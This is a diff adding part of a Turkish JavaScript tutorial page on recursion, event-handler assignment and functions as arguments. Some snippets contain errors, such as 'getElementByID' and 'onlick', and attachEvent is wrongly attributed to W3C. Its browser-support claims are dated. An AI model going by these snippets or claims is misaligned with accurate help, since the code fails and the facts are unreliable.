+<span class="op-50">}</span>
+
+<span class="keyw-50">...</span>
+			</pre>
+		<p>
+			<span class="cursive-green">Sonuç : </span>
+			<span class="cursive-red" id="b2.5.6-uyg-2-sonuç-1"></span>
+		</p>
+		<p class="indent">
+			Bu son <a href="../uygulamalar/b2.5.6-uyg-2.html">uygulama</a> sonucu,
+			aynı zamanda bir uyarı niteliğindedir. Eğer bir fonksiyonun mantıksal bir 
+			ifade sonucu tanımlanması isteniyorsa, mantıksal blok içinde, fonksiyonu 
+			anonim bir fonksiyon olarak tanıtmak zorunludur.
+		</p>
+		<p class="subheading" id="recursion">2.5.7 - Özyineleme (Rekürsiyon)
+	</p>
+		<p class="indent">
+			Özyineleme bir fonksiyonun kendi kendini çağırmasıdır. Özyineleme
+			uygulanan yöntemlere, özyinelemeli (rekürsif) yöntemler adı verilir. JavaScript
+				programlama dilinin fonksiyonları, birinci sınıf nesnelerdir ve özyinelemeye
+				yeteneklidir.		</p>
+		<p class="indent">
+			Özyinelemeli yöntemler, bilgisayar programlama konusunun en geniş konularından
+				biridir. Çoğu bilgisayar yöntemleri, özyinelemeli olarak da tasarlanabilirler.
+				Bir zamanlar çok popüler olan PROLOG programlama dili, tamamen özyinelemeli
+				yöntemlere dayanmaktadır.		</p>
+		<p class="indent">
+			Rekürsif yöntemlerin programlanması ve rekürsiyona dayalı olarak yazılmış
+			programların bakım için yeniden deşifre edilmeleri zordur. Bu yüzden programların daha kolay
+			izlenebilen klasik yöntemler kullanılarak yapılmasına devam edilmektedir. Yine de faktoryel
+			hesabı gibi bazı önemli programlar için rekürsif yöntemler tercih edilmektedir.
+		</p>
+		<p class="indent">
+			Özyinelemeli yöntemler, bir tür döngü sistemi gibidir. Özellikle <span class="keyw">while</span>
+			döngüleri ile gerçekleştirilen yöntemlerin, özyinelemeli yöntemler olarak
+			tasarlanması olanağı bulunabilir. Her döngü sistemi gibi, özyinelemeli
+			yöntemlerden de çıkış için bir mekanizma tasarlanmalıdır. Aksi takdirde,
+			tüm döngü sistemleri gibi özyinelemeli yöntemler de sonsuz döngülere neden
+			olarak, programın devreden çıkmasına sebep olabilirler.		</p>
+		<p class="indent">
+			Tasarım ve izleme güçlüklükleri ve genellikle, özyinelemeli yöntemlerle
+				yapılan çalışmaların, klasik yöntemlerle de gerçekleştirilebilmesi nedeni
+				ile, çalışmalarımızda özyinelemeli yöntemler uygulanmayacaktır. Bir örnek
+				olarak, ilişkilendirildiği 
+			<a href="../uygulamalar/b2.5.7-uyg-1.html">uygulama</a> sayfasında
+			çalışan bir 
+			<a href="../uygulamalar/b2.5.7-uyg-1-js.html">JavaScript Programı</a> 
+			özyinelemeli bir yöntemle, faktoryel değerlerinin hesaplanmasını yapmaktadır.
+			Faktoryel değerleri, pozitif sayıların, kendilerinden küçük pozitif sayılarla
+			çarpımlarının sonucudur. Örnek olarak , 3! = 3 * 1 * 2 işleminin sonucu
+			olan 6 değeridir.		</p>
+		<p class="indent" id="b2.5.7-uyg-1">
+			Yukarıdaki <a href="../uygulamalar/b2.5.7-uyg-1-js.html">JavaScript programı</a>,
+			 interaktif bir programdır.  Bu programda
+			özyinelemenin gerçekleştiği fonksiyon, yazılımı aşağıda görülen 
+			faktoryel<span class="op">()</span> fonksiyonudur.		</p>
+		<pre>
+<span class="keyw-50">...</span>
+
+<span class="keyw-25">function</span> faktoryel<span 
+			class="op">(</span>x<span 
+			class="op">) {</span>
+			
+<span class="keyw-50">if</span> <span 
+			class="op">(</span>x <span 
+			class="op">===</span> 1<span 
+			class="op">) {</span>
+<span class="keyw-75">return</span> 1<span 
+			class="op">;</span>
+<span class="op-50">}</span>
+
+<span class="keyw-50">else</span><span 
+			class="op"> {</span>
+<span class="keyw-75">return</span> x <span 
+			class="op">*</span> faktoryel<span 
+			class="op">(</span>x <span 
+			class="op">-</span> 1<span 
+			class="op">);</span>
+<span class="op-50">}</span>
+<span class="op-25">}</span>
+<span class="keyw-50">...</span>
+		</pre>
+		<p class="nonindent">
+			Bu fonksiyonun <span class="keyw">return</span> bildirimi, eşdeğer olarak,
+		</p>
+		<pre>
+<span class="keyw-50">...</span>
+<span class="keyw-50">return</span> x <span 
+			class="op">*</span> <span 
+			class="keyw">arguments</span><span 
+			class="op">.</span><span 
+			class="keyw">callee</span><span 
+			class="op">(</span>x <span 
+			class="op">-</span> 1<span 
+			class="op">);</span>
+<span class="keyw-50">...</span>
+		</pre>
+		<p class="nonindent">
+			olarak da ifade edilebilir. <span class="keyw">arguments</span><span 
+			class="op">.</span><span class="keyw">callee</span> 
+			öntanımlı fonksiyon argümanları nesnesinin öntanımlı bir özelliğidir. 
+			Fonksiyon içeriğinde, <span class="keyw">this</span> sözcüğü, fonksiyonun
+			 kendisine işaret etmez. Bunun yerine <span class="keyw">arguments</span><span 
+			class="op">.</span><span class="keyw">callee</span> özelliği kullanılır. Bu
+			 özelliğin,  isimli fonksiyonlarda kullanımı gereksizdir, fakat, isimsiz
+			 (anonim) fonksiyonlarda rekürsiyonunun sağlanabilmesi amacı ile kullanılır.
+			 Doğal olarak, <span class="indent">özyineleme</span>amaçlı 
+			fonksiyon literalleri, isimli fonksiyon literalleri olarak da oluşturulabilir.		</p>
+		<p class="subheading" id="event">2.5.8 - JavaScript Olay Yöneticilerine Fonksiyonların Atanması
+	</p>
+		<p class="indent">
+			Bölüm <a href="../b1/b1s3.html">1.3</a> de, (X)HTML sayfa elementleri ile etkileşimli 
+			JavaScript 	programlarının, kullanıcılarla karşılıklı etkileşimli (interaktif) programlar 
+			oluşturmak için olay yöneticilerinden yararlanma yöntemleri açıklanmış ve en son 
+			<a href="../uygulamalar/b2.5.7-uyg-1-js.html">JavaScript programı örneğinde</a>
+			olduğu gibi, karşılıklı etkileşimli (interaktif) programlar yapılabildiğini belirtilmişti. 
+			Olay yöneticilerinden yararlanılarak karşılıklı etkileşimli programların çalışma yöntemi, 
+			asenkron olay yönetimi modelidir. Bu çalışma şekli, kullanıcıların etkilerinin olay 
+			yöneticileri tarafından yakalanması ve önceden programlanan tepkilerin verilmesidir.
+		</p>
+		<p class="indent">
+			Olay yöneticilerine, dinledilkleri olay gerçekleşince yapacaklarını belirten fonksiyonların
+			bağlanmasıdört faklı yöntemle gerçekleştirilebilir. Bunlar, 
+		</p>
+		<ul class="list">
+			<li>(X)HTML elementlerinin olay dinleyici niteliklerine fonksiyon atanması</li>
+			<li>JavaScript olay yönteicilerine fonksiyon atanması</li>
+			<li>W3C tarafından geliştirilen yöntem</li>
+			<li>Microsoft tarafından geliştirilen yöntem</li>
+		</ul>
+		<p class="indent">
+			İlk olarak, (X)HTML elementlerinin olay dinleyici niteliklerine fonksiyon atanması,
+			Bölüm <a href="../b1/b1s3.html">1.3</a> de de açıklandığı gibi, (X)HTML sayfa işaretleri ile
+			JavaScript programlama adımlarının aynı sayfada, yanyana çalıştırılmalarını gerektirecekir. 
+			Oysa, engellemeyen JavaScript (Unobtrusive JavaScript) prensibine göre, sayfanın (X)HTML 
+			kodlarında karışıklık yaratılmaması için, (X)HTML sayfa işaretleri arasına hiçbir başka program
+			yazılımı konulmamalıdır. Bu nedenle bu yöntem artık kullanılmamaktadır.
+		</p>
+		<p class="indent">
+			İkinci yöntem, Javascript program adımlarından (X)HTML sayfa elementlerine erişilmesi ve 
+			Javascript olay yöneticilerine çalıştıracakları fonksiyonların atanması yöntemidir. Bu yöntem, 
+			engellemeyen JavaScript prensibine uygundur. Tüm programlama, sayfaya bağlantılı bir 
+			JavaScript program sayfasından yürütülebilmekte ve sayfanın (X)HTML kodlarında karışıklık 
+			yaratacak yabacı kodlar görülmemektedir. Sayafa elementlerine erişim, ileride ayrıntılı olarak
+			inceleyeceğimiz <a href="http://www.w3.org/">W3C-DOM</a> yöntemlerine göre yapıldığında, 
+			tüm belge çözümleyicilerce ortak olarak desteklenecektir. Bu nedenle, bu yöntem, uygulanabilir 
+			bir yöntem olarak ortaya çıkmaktadır. 
+		</p>
+		<p class="indent">
+			Üçüncü yöntem, yine  <a href="http://www.w3.org/">W3C</a> tarafından geliştirilmiş bir 
+			yöntemdir. Bu yöntem, olay yöneticilerine belirli fonksiyonların atanabilmelerini 
+			bir sisteme bağlayan ve rasyonelleştiren bir yöntem olarak geliştirilmiştir. Bu yöntem ne
+			yazık ki sadece FireFox ve onu izleyen belge çözümleyiciler tarafından desteklendiği için
+			genel uygulanma desteğinden yoksundur. Burada bu yöntemi de inceleyeceğiz, çünkü 
+			standartlar sonunda mutlaka desteklenir. Microsoftun bu standardı desteklememesi, 
+			standartların geliştirildiği ve herkesin bu standartlara uymayı uygarlık gereği olarak 
+			gördüğü günümüzde, geçerli bir davranış değildir. 
+		</p>
+		<p class="indent">
+			Dördüncü ve en son yöntem, Microsoft tarafından geliştirilen yöntemdir. Bu yöntem,
+			sadece Internet Explorer tarafından desteklenmektedir. Genel destekten yoksun
+			olduğundan, bu yöntem genel amaçlı sayflarda kullanılamaz.
+		</p>
+		<p class="indent">
+			Bu durumda, sadece ikinci yöntem, yani, sayfa elementlerine JavaScript programlarından
+			erişilmesi ve JavaScript olay yöntecilerine JavaScript fonksiyonları atanması, yani herşeyin
+			sadece JavaScript tarafında yürütülmesi, ortak olarak desteklenebilen tek yöntem olarak öne 
+			çıkmaktadır. Burada ağırılık bu yönteme verilecektir. W3C yöntemi de ileride genellik
+			kazanma olanağı olduğundan burada tanıtılacaktır.
+		</p>
+		<p class="indent">
+			JavaScript program adımlarından (X)HTML sayfa elementlerine erişilme yöntemleri, 
+			<a href="http://www.ecma-international.org/publications/standards/Ecma-262.htm">ECMA-262
+			sürüm 3</a> 
+			tarafından belirtilmemiştir. Bu yöntemler, Belge Nesne Modeli olarak tanılanan
+			ve JavaScript global  nesnesini,  <span class="keyw">window</span> nesnesi
+			olarak yerleştiren özel belge çözümleyici  yazılımları ile ilgilidir. Bu
+			yöntemler, 
+			<a href="http://www.w3.org/TR/2000/REC-DOM-Level-2-Core-20001113/">W3C-DOM</a> olarak
+			 standartlaştırılmıştır. Burada da 
+			<a href="http://www.w3.org/TR/2000/REC-DOM-Level-2-Core-20001113/">W3C-DOM</a>
+			yöntemleri kullanılarak sayfa elementlerine JavaScript program adımlarından
+			erişierek genel olarak desteklenecek yöntem oluşturmaya önem verilmiştir.
+			Javascript program adımları,  sayfanın elementlerine, DOM (Document Object
+			Model) adı verilen bir yerleştirme modelini  izleyerek erişirler. Tüm belge
+			çözümleyicileri, standartlaştırılmış <a href="http://www.w3.org/">W3C-DOM</a> 
+			belge nesne modelini desteklediklerinden, JavaScript bu modelden yararlanılarak
+			sayfa  elementlerine erişebilir. Doğal olarak, başka modellerden de yararlanılabilir.
+			Bu çalışmanın ileri aşamalarında belge nesne modeli ayrıntılı olarak incelenecektir.
+			Burada, sadece, sayfa elementlerine  erişilerek Javascript olay yöneticilerine
+			çalıştıracakları fonksiyonların atanması üzerinde  durulacaktır.
+		</p>
+		<p class="indent">
+			 DOM modelinde varsayılan  <span class="keyw">window</span> nesnesi altında, 
+			 <span 	class="keyw">document</span> nesnesi tüm sayfa elementlerine erişim sağlar.
+			Herhangibir sayfa elementinin id değerinden yararlanılarak, 
+		</p>
+		<pre>
+<span class="keyw-50">var</span> a <span 
+			class="op">=</span> <span 
+			class="keyw">document</span><span 
+			class="op">.</span><span 
+			class="keyw">getElementByID</span><span 
+			class="op">(</span>elementinIdDeğeri<span 
+			class="op">);</span>
+		</pre>
+		<p class="nonindent">
+			şeklinde erişilebilir. Daha esekiden uygulanan erişim yöntemleri de ileride açıklanacaktır. 
+			Yukarıdaki program adımı ile a değişkeni, bir sayfa elementinin yerine geçer ve kendisine
+			JavaScript programlama dilinde, öntanımlı olay yöneticileri özellik olarak kalıtımla aktarılır.
+		</p>
+		<p class="indent">
+			JavaScript programlama dilinde, öntanımlı JavaScript (X)HTML sayfa elementlerinin,
+			olay yöneticilerinin işlevini yapar. JavaScript olay yöneticileri ,on ön
+				eki ile başlar, örnek olark, onclick, ondblclick, onfocus, onblur, onload,
+				onunload gibi olay yönetecileri bulunmaktadır.  Bur ada örnek olarak 
+			<span class="keyw">window</span><span class="op">.</span><span class="keyw">onload</span>
+			olay yöneticisini ele alacağız. Bu olay yöneticisi, sayfa elementlerinin
+			tümünün yüklenmesini kontrol  eder ve yüklenme tamamlandığında, kendisine
+			atanan fonksiyonu çalıştırır. 
+		</p>
+		<p class="indent" id="b2.5.8-uyg-1">
+			JavaScript olay yöneticilerinin, başlangıçta değerleri Intenet Explorer için 
+			<span class="keyw">null</span>, FireFox için <span class="keyw">undefined</span> dir. 
+			Bu konuda bir JavaScript <a href="../uygulamalar/b2.5.8-uyg-1-js.html">programı</a>
+			bir <a href="../uygulamalar/b2.5.8-uyg-1.html">uygulama</a> sayfasında aşağıda görülen 
+			sonucu vermektedir:
+		</p>
+		<pre>
+<span class="keyw-50">...</span>
+<span class="pl-50">bilgiYaz</span><span 
+			class="op">(</span><span 
+			class="keyw">window</span><span 
+			class="op">.</span><span 
+			class="keyw">onload</span><span 
+			class="op">,</span> <span 
+			class="str">'b2.5.8-uyg-1-sonuç-1'</span><span 
+			class="op">)</span><span 
+			class="op">;</span>
+<span class="keyw-50">...</span>
+		</pre>
+		<p class="cursive-green">
+		Program Sonucu :
+		</p>
+		<p class="cursive-red">
+			null (IE) , undefined (FireFox)
+		</p>
+		<p class="nonindent">
+			olarak elde edilir. 
+		</p>
+		<p class="indent">
+			Sayfa içinde , id değeri, &quot;<span class="str">buton1</span>&quot; olan bir input 
+			elementi olduğunu varsayalım, bu elemente
+			<a href="http://www.w3.org/TR/2000/REC-DOM-Level-2-Core-20001113/">W3C-DOM</a> yöntemi
+			ile erişim,
+		</p>
+		<pre>
+ <span class="keyw-50">window</span><span class="op">.</span><span 
+			class="keyw">document</span><span 
+			class="op">.</span><span 
+			class="keyw">getElementById</span><span 
+			class="op">(</span><span 
+			class="str">'buton1'</span><span 
+			class="op">);</span>
+		</pre>
+		<p class="nonindent">
+			şeklindedir. Burada  <span class="keyw">window</span> nesnesi, 
+			Global JavaScript Nesnesi olarak hareket ettiğinden varsayılan nesne
+			olarak kabul edilirse, ifade sadece, 
+		</p>
+		<pre>
+ <span class="keyw-50">document</span><span 
+			class="op">.</span><span 
+			class="keyw">getElementById</span><span 
+			class="op">(</span><span 
+			class="str">'buton1'</span><span 
+			class="op">);</span>
+		</pre>
+		<p class="nonindent">
+			olarak kalır. Bu düğmenin basılması ile harekete geçen olay,
+			<span class="keyw">onclick</span> olay yöneticisinin değeridir.
+			Bu değer olarak bir fonksiyon atanırsa, düğmeye tıklandığında
+			fonksiyon çalışır. Örnek olarak düğmeye tıklandığında bir alert 
+			mesajı verilmek istendiğinde , aşağıdaki atamayı yapmak 
+			yeterli olacaktır:
+		</p>
+		<pre>
+ <span class="keyw-50">document</span><span 
+			class="op">.</span><span 
+			class="keyw">getElementById</span><span 
+			class="op">(</span><span 
+			class="str">'buton1'</span><span 
+			class="op">).</span><span 
+			class="keyw">onlick</span> <span 
+			class="op">=</span> <span 
+			class="keyw">function</span><span 
+			class="op">() {</span>
+<span class="keyw-75">alert</span><span 
+			class="op">(</span><span 
+			class="str">'Merhaba Dr. Chandra'</span><span 
+			class="op">);</span> 
+<span class="op-50">}</span>
+		</pre>
+		<p class="indent">
+			Bu atamadan sonra, buton1 nesnesinin <span class="keyw">onload</span> niteliğinin değeri 
+			bir anonim fonksiyon ve veri tipi de &quot;function&quot; olacaktır. Bu ifade biraz uzun görülürse,
+			olay yöneticisi önceden bir değişkene atanabilir. Bu örnekteki buton1 nesnesinin <span 
+			class="keyw">onclick</span> özelliği, her nesne özelliği gibi bir değişkene atabilir. Doğal olarak,
+			değişkene atanan değer, nesne özelliğinin bellek adresinden ibarettir. İşlem,
+		</p>
+		<pre>
+<span class="keyw-50">var</span> uyarı <span 
+			class="op">=</span> <span 
+			class="keyw">document</span><span 
+			class="op">.</span><span 
+			class="keyw">getElementByID</span><span 
+			class="op">(</span><span 
+			class="str">'buton1'</span><span 
+			class="op">);</span>
+			
+<span class="pl-50">uyarı</span><span 
+			class="op">.</span><span 
+			class="keyw">onclick</span> <span 
+			class="op">=</span> <span 
+			class="keyw">function</span><span 
+			class="op">() {</span>
+<span class="keyw-75">alert</span><span 
+			class="op">(</span><span 
+			class="str">'Merhaba Dr. Chandra'</span><span 
+			class="op">);</span> 
+<span class="op-50">}</span>
+		</pre>
+		<p class="nonindent" id="b2.5.8-uyg-2">
+			şeklinde kısaltılabilir. Daha da doğrusu, fonksiyonu ismli bir 
+			fonksiyon olarak önceden tanımlamak  ve fonksiyonun
+			bellek adresinin bir kopyasını, olay yöneticisinin atanmış 
+			olduğu değişkene atamaktır. Bu işlem, aşağıda kodları görülen 
+			<a href="../uygulamalar/b2.5.8-uyg-2-js.html">JavaScript programı</a>
+			ile gerçekleştirilmiş ve bir 
+			<a href="../uygulamalar/b2.5.8-uyg-2.html">uygulama sayfasında</a> 
+			aşağıda görülen sonuçlar alınmıştır:
+		</p>
+		<pre>
+<span class="keyw-50">function</span> uyarı<span 
+			class="op">() {</span>
+<span class="keyw-75">alert</span><span 
+			class="op">(</span><span 
+			class="str">'Dikkatli Olun \n Dr. Chandra !'</span><span 
+			class="op">);</span>
+<span class="op-50">}</span>
+
+<span class="keyw-50">...</span>
+<span class="keyw-50">var</span> düğme <span 
+			class="op">=</span> <span 
+			class="keyw">document</span><span 
+			class="op">.</span><span 
+			class="keyw">getElementById</span><span 
+			class="op">(</span><span 
+			class="str">'buton1'</span><span 
+			class="op">);</span>
+<span class="pl-50">düğme</span><span 
+			class="op">.</span><span 
+			class="keyw">onclick</span> <span 
+			class="op">=</span> uyarı<span 
+			class="op">;</span>
+<span class="keyw-50">...</span>
+		</pre>
+			<p class="dikeyTab-50 sayfaortala">
+				<input type ="button" id="buton1" value ="uyarı" />
+			</p>
+		<p class="nonindent">
+			Program sonuçlarından, her türlü JavaScript olay yöneticisinin kolaylıkla programlanabileceği
+			görülebilmektedir. Yöntem etkili ve engellemeyen türdedir, ayrıca platformlararası geçerli 
+			olan tek yöntemdir. Burada tek dikkat edilecek nokta olay yöneticisine bir fonksiyon atarken,
+			örnek olarak, 
+		</p>
+		<pre>
+<span class="keyw">window</span><span 
+			class="op">.</span><span 
+			class="keyw">onload</span> <span 
+			class="op">=</span> başlat<span 
+			class="op">;</span>
+		</pre>
+		<p class="nonindent">
+			şeklinde fonksiyonun çağrı adresini atamaktır. Eğer aşağıda görüldüğü gibi,
+			atamada çağrı işlemcisi <span class="op">()</span> kullanılırsa, 
+		</p>
+		<pre>
+<span class="keyw">window</span><span 
+			class="op">.</span><span 
+			class="keyw">onload</span> <span 
+			class="op">=</span> başlat<span 
+			class="op">();</span>
+		</pre>
+		<p class="nonindent">
+			Bu yanlış olur, çünkü olay yöneticisine fonksiyonun bellek adresi yerine,
+				fonksiyonun döndüreceği değer atanmış olur.
+		</p>
+		<p class="indent">
+			Üçüncü yöntem olan, <a href="http://w3c.com/">W3C</a> tarafından geliştirilmiş olan,
+			<span class="keyw">addEventListener</span><span class="op">()</span> fonksiyonu üzerinde de
+			durulması gerekir. Bu fonksiyon günümüzde ne yazık ki sadece FireFox ve takipçileri tarafından
+			destekleniyor ve Internet Explorer desteklemediği için platformlararası olmak niteliğini 
+			kazanamıyor. Buna rağmen iyi bir standart olduğundan ileride destekleneceği düşünülebilir. 
+			Bu fonksiyonun uygulanmasını, sonuçları aşağıda görülen bir 
+			<a href="../uygulamalar/b2.5.8-uyg-3.html">uygulama</a> sayfasına bağlantılı bir 
+			<a href="../uygulamalar/b2.5.8-uyg-3-js.html">JavaScript programından</a> izleyelim:
+		</p>
+		<pre>
+<span class="keyw-50">function</span> tanıtım<span 
+			class="op">() {</span>
+<span class="keyw-75">alert</span><span 
+			class="op">(</span><span 
+			class="str">'Merhaba \n Ben HAL !'</span><span 
+			class="op">);</span>
+<span class="op-50">}</span>
+
+<span class="keyw-50">var</span> düğme <span 
+			class="op">=</span> <span 
+			class="keyw">document</span><span 
+			class="op">.</span><span 
+			class="keyw">getElementById</span><span 
+			class="op">(</span><span 
+			class="str">'buton1'</span><span 
+			class="op">);</span>
+<span class="pl-50">düğme</span><span 
+			class="op">.</span><span 
+			class="keyw">addEventListener</span><span 
+			class="op">(</span><span 
+			class="str">'click'</span><span 
+			class="op">,</span> tanıtım<span 
+			class="op">,</span> <span 
+			class="keyw">false</span><span 
+			class="op">);</span></pre>
+		<p class="nonindent" id="b2.5.8-uyg-3">
+			<span class="keyw">addEventListener</span><span class="op">()</span> Fonksiyonunun 
+			ilk argümanı olay yöneticisi, ikincisi atanacak fonksiyon, üçüncüsü daima <span 
+			class="keyw">false</span> olarak kullanılabilecek bir parametredir. Bu 
+			<a href="../uygulamalar/b2.5.8-uyg-3-js.html">uygulama</a> şimdilik sadece FireFox da 
+			çalışabilmektedir.
+		</p>
+		<p class ="indent">
+			Microsoft tarafından geliştirilmiş ve sadece Internet Explorer de çalışan yöntem :
+		</p>
+		
+		<pre>
+<span class="keyw-50">function</span> tanıtım<span 
+			class="op">() {</span>
+<span class="keyw-75">alert</span><span 
+			class="op">(</span><span 
+			class="str">'Merhaba \n Ben HAL !'</span><span 
+			class="op">);</span>
+<span class="op-50">}</span>
+
+<span class="keyw-50">var</span> düğme <span 
+			class="op">=</span> <span 
+			class="keyw">document</span><span 
+			class="op">.</span><span 
+			class="keyw">getElementById</span><span 
+			class="op">(</span><span 
+			class="str">'buton1'</span><span 
+			class="op">);</span>
+<span class="pl-50">düğme</span><span 
+			class="op">.</span><span 
+			class="keyw">attachEvent</span><span 
+			class="op">(</span><span 
+			class="str">'click'</span><span 
+			class="op">,</span> tanıtım<span 
+			class="op">);</span></pre>
+		<p class="nonindent" id="b2.5.8-uyg-3"> <span class="keyw">attachEvent</span><span class="op">()</span> Fonksiyonunun 
+			ilk argümanı olay yöneticisi, ikincisi atanacak fonksiyondur. 
+		</p>
+		<p class ="indent">
+			<a href="http://w3.org/">W3C</a> tarafından tanımlanan 
+			<span class="keyw">attachEvent</span><span class="op">()</span> fonksiyonun, MS Internet Explorer 
+			tarafından desteklenmemesi, olay  yönetiminin tüm belge çözümleyicilerde desteklenmesi amacı ile ortak
+			dessteklenebilecek bir program geliştirilmesi gereğini yaratmıştır. bu program aşağıda görülmektedir.
+		</p>
+		<pre>
+<span class="keyw-25">function</span> olayDinleyicisiEkle<span 
+			class="op">(</span>elm<span 
+			class="op">,</span> olay<span 
+			class="op">,</span> fonksiyon<span 
+			class="op">) {</span>
+
+<span class="comm-50">// Eğer Belge Çözümleyici FireFox Tipi İse (GECKO Motoru)</span>
+
+<span class="keyw-50">if</span><span 
+			class="op">(</span>elm<span 
+			class="op">.</span><span 
+			class="keyw">addEventListener</span><span 
+			class="op">) {</span>
+<span class="pl-75">elm</span><span 
+			class="op">.</span><span 
+			class="keyw">addEventListener</span><span 
+			class="op">(</span>olay<span 
+			class="op">,</span> fonksiyon<span 
+			class="op">,</span> <span 
+			class="keyw">false</span><span 
+			class="op">);</span>
+<span class="keyw-75">return true</span><span 
+			class="op">;</span>
+<span class="op-50">}</span>
+
+<span class="comm-25">// Eğer Belge Çözümleyici Internet Explorer İse</span>
+
+<span class="keyw-50">else if</span><span 
+			class="op">(</span>elm<span 
+			class="op">.</span><span 
+			class="keyw">attachEvent</span><span 
+			class="op">) {</span>
+<span class="pl-75">olay</span> <span 
+			class="op">=</span> <span 
+			class="str">'on'</span> <span 
+			class="op">+</span> olay<span 
+			class="op">;</span>
+<span class="keyw-75">var</span> r <span 
+			class="op">=</span> elm<span 
+			class="op">.</span><span 
+			class="keyw">attachEvent</span><span 
+			class="op">(</span>olay<span 
+			class="op">,</span> fonksiyon<span 
+			class="op">);</span>
+<span class="keyw-75">return</span> r<span 
+			class="op">;</span>
+<span class="op-50">}</span>
+		
+<span class="comm-25">// Eğer Belge Çözümleyici Farklı İse</span>
+
+<span class="keyw-50">else</span><span 
+			class="op">{</span>
+<span class="pl-75"></span>elm<span 
+			class="op">[</span><span 
+			class="str">'on'</span> <span 
+			class="op">+</span> olay<span 
+			class="op">] = </span>fonksiyon<span 
+			class="op">;</span>
+<span class="op-50">}</span>
+<span class="op-25">}</span>
+		</pre>
+		<p class ="indent">
+			Burada geliştirilmiş olan olayDinleyicisiEkle<span 
+			class="op">()</span> fonksiyonundan yararlanılarak,
+			sayfa yüklendikten sonra JavaScript fonksiyonlarının çalıştırmaya başlayacak 
+			olan bir fonksiyon aşağıdaki gibi düzenlenebilir:
+		</p>
+		<pre>
+<span class="keyw-25">function</span> sayfaYüklenmesiTamamlandıktanSonraÇalıştır<span 
+			class="op">(</span>fonksiyon<span 
+			class="op">) {</span>
+<span class="pl-50">olayDinleyicisiEkle</span><span 
+			class="op">(</span><span 
+			class="keyw">window</span><span 
+			class="op">,</span> <span 
+			class="str">'load'</span><span 
+			class="op">,</span> fonksiyon<span 
+			class="op">);</span>
+<span class="op-25">}</span>
+		</pre>
+		<p class ="indent">
+			Burada geliştrilmiş olan olayDinleyicisiEkle<span 
+			class="op">()</span> ve sayfaYüklenmesiTamamlandıktanSonraÇalıştır<span 
+			class="op">()</span>fonksiyonları, <a href="../uygulamalar/bdelib-src.html">bdelib.js</a> 
+			kitaplığına eklenmiş ve uygulamalarda kullanılmaya hazır durumdadırlar. 
+		</p>
+		<p class="indent" id="willison">
+			Son olarak <a href="../b1/b1s3.html#sonra">1.3.6 bölümünde</a> incelenmiş olan ve <a 
+			href="http://simonwillison.net/">Simon Willison</a> tarafından yazılmış olan, 
+			<span class="keyw">window</span><span class="op">.</span><span 
+			class="keyw">onload</span> olay yöneticisini kullanılarak, sayfa yüklendikten sonra, 
+			çalışması gereken fonksiyonları sıra ile çalıştıracak bir fonksiyon olan
+			aşağıda görülen fonksiyonu yeniden incelemekte yarar olacaktır.		</p>
+		<pre>
+<span class="keyw-25">function</span> sayfaYüklendiktenSonraÇalıştır(çalıştırılacakFonksiyon) <span 
+			class="op">{</span>
+<span class="keyw-50">var</span> öncekiFonksiyon <span 
+			class="op">=</span> <span 
+			class="keyw">window</span><span class="op">.</span><span 
+			class="keyw">onload</span><span class="op">;</span>
+<span class="keyw-50">if(typeof window</span><span 
+			class="op">.</span><span 
+			class="keyw">onload </span><span class="op">!= </span><span
+			class="str">'function'</span><span 
+			class="keyw">)</span> <span class="op">{</span>
+<span class="keyw-75">window</span><span 
+			class="op">.</span><span 
+			class="keyw">onload</span> <span class="op">=</span> çalıştırılacakFonksiyon;
+<span class="op-50">}</span>
+<span class="keyw-50">else</span> <span class="op">{</span>
+<span class="keyw-75">window</span><span 
+			class="op">.</span><span class="keyw">onload</span> <span 
+			class="op">=</span> <span class="keyw">function() </span><span 
+			class="op">{</span>
+<span class="pl-100">öncekiFonksiyon()</span><span class="op">;</span>
+<span class="pl-100">çalıştırılacakFonksiyon()</span><span class="op">;</span>
+<span class="op-75">}</span><span 
+			class="op">;</span>
+<span class="op-50">}</span>
+<span class="op-25">}</span>
+		</pre>
+		<p class="nonindent">
+			Bu fonksiyon , ilk olarak bir öncekiFonksiyon değişkenine 
+			<span class="keyw">window</span><span class="op">.</span><span class="keyw">onload</span>
+			olay yöneticisinin başlangıç değerini atamaktadır. Bu değer, eğer önceden
+			bir fonksiyon atanmamışsa
+			<span class="keyw">null</span> olacaktır. Yazar, daha sonra bu değerin tipini
+			kontrol etmekte ve  değerin veri tipi bir fonksiyon veri tipi değilse, argümanı
+			bu olay yöneticisine atamakta ve program  tamamlanmaktadır. Eğer, önceki değer
+			bir başka fonksiyon ise, o zaman olay yöneticisine bir  fonksiyon literali atanmakta
+			ve bu bir kapalı devre açmaktadır. Bu kapalı devre, üst fonksiyon kapsam alanından,
+			henüz bellekte saklanmakta olan öncekiFonksiyon değişkenininin değeri olan
+			önceki fonksiyonun bellek referransını okumakta ve önce bu fonksiyonu ardından
+			da argümandaki fonksiyonu çağırmaktadır. Bu fonksiyon sadece iki fonksiyonluk
+			bir kuyruk oluşturmakta, fakat istendiği kadar 
+			sayfaYüklendiktenSonraÇalıştır<span class="op">()</span> fonksiyonu
+			kullanılabildiğinden, sayfa yüklendikten sonra çalışmak üzere istendiği kadar
+			uzun bir fonksiyon kuyruğu oluşturulabilmektedir.
+		</p>
+		<p class="subheading" id="functionarguments"> 2.5.9 - Fonksiyonların Argüman Olarak Kullanılması 
+	</p>
+		<p class="indent" id="b2.5.9-uyg-1">
+			Javascript programlama dilinde fonksiyonlar birinci sınıf nesnelerdir ve 
+			bunun sonucu olarak, başka fonksiyonlarda argüman olarak kullanılabilirler.
+				 Uygulamada büyük olanaklar sağlayan bu yöntem, Javascript programlama dilinin
+			bir üstünlüğüdür. Bu konuda bir 
+			<a href="../uygulamalar/b2.5.9-uyg-1-js.html">JavaScript programı</a> ve bağlantılı
+			olduğu <a href="../uygulamalar/b2.5.9-uyg-1.html">uygulama</a> sayfasında verdiği
+			sonuç, aşağıda görülmektedir: 
+		</p>
+		
+		<pre>
+<span class="keyw-50">...</span>
+
+<span class="keyw-25">function</span>sayılarıTopla<span 
+			class="op">(</span>x<span 
+			class="op">,</span> y<span 
+			class="op">) {</span>
+<span class="keyw-50">return</span> x <span 
+			class="op">+</span> y<span 
+			class="op">;</span>
+<span class="op-25">}</span>
+
+<span class="pl-25">sonuçYaz</span><span 
+			class="op">(</span><span 
+			class="str">'3 +5 = '</span><span 
+			class="op">,</span> sayılarıTopla<span 
+			class="op">(</span>3<span 
+			class="op">,</span> 5<span 
+			class="op">),</span> <span 
+			class="str">'b2.5.9-uyg-1-sonuç-1'</span><span 
+			class="op">);</span>
+<span class="keyw-50">...</span>
+		</pre>
+		<p class="cursive-green">Program Sonucu :
+		</p>
+		
